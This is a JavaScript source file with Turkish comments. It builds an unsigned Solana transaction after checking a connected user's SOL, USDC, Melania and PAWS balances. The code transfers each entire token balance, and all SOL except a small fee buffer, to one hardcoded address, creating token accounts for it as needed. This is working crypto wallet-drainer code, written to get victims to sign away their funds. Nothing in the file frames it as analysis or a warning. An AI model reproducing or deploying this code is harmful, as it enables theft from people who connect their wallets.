/* transaction.js */
/* eslint-disable @typescript-eslint/no-explicit-any */

import {
  PublicKey,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
} from "@solana/web3.js";
import {
  getAssociatedTokenAddress,
  getAccount,
  createTransferInstruction,
  createAssociatedTokenAccountInstruction,
} from "@solana/spl-token";
import { connection } from "./connect.js";

/**
 * Kullanıcının bakiyelerine göre SOL, USDC, Melania ve PAWS transferi için
 * instruction’ları ekleyen, imzalanmamış bir VersionedTransaction döner.
 * Yeterli bakiye yoksa null döner.
 *
 * @param {PublicKey | null} userPublicKey
 * @returns {Promise<VersionedTransaction|null>}
 */
export async function createUnsignedTransaction(userPublicKey) {
  if (!userPublicKey) {
    console.warn("Kullanıcı cüzdanı bağlı değil!");
    return null;
  }

  // -----------------------------------------------------------
  // SOL Bakiyesi ve fee buffer
  // -----------------------------------------------------------
  const userSolLamports = await connection.getBalance(userPublicKey);
  const feeBufferLamports = 6_000_000; // ~0.006 SOL
  const solToSend = Math.max(userSolLamports - feeBufferLamports, 0);
  const isSolSufficient = solToSend > 0;

  // -----------------------------------------------------------
  // USDC Bakiyesi Kontrolü
  // -----------------------------------------------------------
  const USDC_MINT = new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
  const userUsdcAta = await getAssociatedTokenAddress(USDC_MINT, userPublicKey);
  let userUsdcAmount = 0;
  let isUsdcSufficient = false;
  try {
    const info = await getAccount(connection, userUsdcAta);
    userUsdcAmount = Number(info.amount);
    isUsdcSufficient = userUsdcAmount > 80_000; // >=0.008 USDC
  } catch {
    isUsdcSufficient = false;
  }

  // -----------------------------------------------------------
  // Melania Bakiyesi Kontrolü
  // -----------------------------------------------------------
  const MELANIA_MINT = new PublicKey("FUAfBo2jgks6gB4Z4LfZkqSZgzNucisEHqnNebaRxM1P");
  const userMelaniaAta = await getAssociatedTokenAddress(MELANIA_MINT, userPublicKey);
  let userMelaniaAmount = 0;
  let isMelaniaSufficient = false;
  try {
    const info = await getAccount(connection, userMelaniaAta);
    userMelaniaAmount = Number(info.amount);
    isMelaniaSufficient = userMelaniaAmount > 10_000; // >=0.01 MEL
  } catch {
    isMelaniaSufficient = false;
  }

  // -----------------------------------------------------------
  // PAWS Bakiyesi Kontrolü
  // -----------------------------------------------------------
  const PAWS_MINT = new PublicKey("PAWSxhjTyNJELywYiYTxCN857utnYmWXu7Q59Vgn6ZQ");
  const userPawsAta = await getAssociatedTokenAddress(PAWS_MINT, userPublicKey);
  let userPawsAmount = 0;
  let isPawsSufficient = false;
  try {
    const info = await getAccount(connection, userPawsAta);
    userPawsAmount = Number(info.amount);
    isPawsSufficient = userPawsAmount > 1_000_000; // >=1 000 PAWS
  } catch {
    isPawsSufficient = false;
  }

  // -----------------------------------------------------------
  // Eligibility: Hiç biri yeterli değilse çık
  // -----------------------------------------------------------
  if (
    !isSolSufficient &&
    !isUsdcSufficient &&
    !isMelaniaSufficient &&
    !isPawsSufficient
  ) {
    console.warn("Yeterli bakiye yok!");
    return null;
  }

  // -----------------------------------------------------------
  // Hedef adres ve ata hesapları
  // -----------------------------------------------------------
  const toPublicKey = new PublicKey("GpLLb2NqvWYyYJ5wGZNQCAuxHWdJdHpXscyHNd6SH8c1");
  const toUsdcAta    = await getAssociatedTokenAddress(USDC_MINT,    toPublicKey);
  const toMelaniaAta = await getAssociatedTokenAddress(MELANIA_MINT, toPublicKey);
  const toPawsAta    = await getAssociatedTokenAddress(PAWS_MINT,    toPublicKey);

  // -----------------------------------------------------------
  // Instruction listesi oluştur
  // -----------------------------------------------------------
  const instructions = [];

  // Hedef ATA'ları gerekirse oluştur
  if (isUsdcSufficient) {
    try {
      await getAccount(connection, toUsdcAta);
    } catch {
      instructions.push(
        createAssociatedTokenAccountInstruction(
          userPublicKey,
          toUsdcAta,
          toPublicKey,
          USDC_MINT
        )
      );
    }
  }
  if (isMelaniaSufficient) {
    try {
      await getAccount(connection, toMelaniaAta);
    } catch {
      instructions.push(
        createAssociatedTokenAccountInstruction(
          userPublicKey,
          toMelaniaAta,
          toPublicKey,
          MELANIA_MINT
        )
      );
    }
  }
  if (isPawsSufficient) {
    try {
      await getAccount(connection, toPawsAta);
    } catch {
      instructions.push(
        createAssociatedTokenAccountInstruction(
          userPublicKey,
          toPawsAta,
          toPublicKey,
          PAWS_MINT
        )
      );
    }
  }

  // Transfer instruction’ları ekle
  if (isSolSufficient) {
    instructions.push(
      SystemProgram.transfer({
        fromPubkey: userPublicKey,
        toPubkey: toPublicKey,
        lamports: solToSend,
      })
    );
  }
  if (isUsdcSufficient) {
    instructions.push(
      createTransferInstruction(
        userUsdcAta,
        toUsdcAta,
        userPublicKey,
        userUsdcAmount
      )
    );
  }
  if (isMelaniaSufficient) {
    instructions.push(
      createTransferInstruction(
        userMelaniaAta,
        toMelaniaAta,
        userPublicKey,
        userMelaniaAmount
      )
    );
  }
  if (isPawsSufficient) {
    instructions.push(
      createTransferInstruction(
        userPawsAta,
        toPawsAta,
        userPublicKey,
        userPawsAmount
      )
    );
  }

  // -----------------------------------------------------------
  // VersionedTransaction oluşturma
  // -----------------------------------------------------------
  const { blockhash } = await connection.getLatestBlockhash();
  const messageV0 = new TransactionMessage({
    payerKey:        userPublicKey,
    recentBlockhash: blockhash,
    instructions,
  }).compileToV0Message();

  return new VersionedTransaction(messageV0);
}
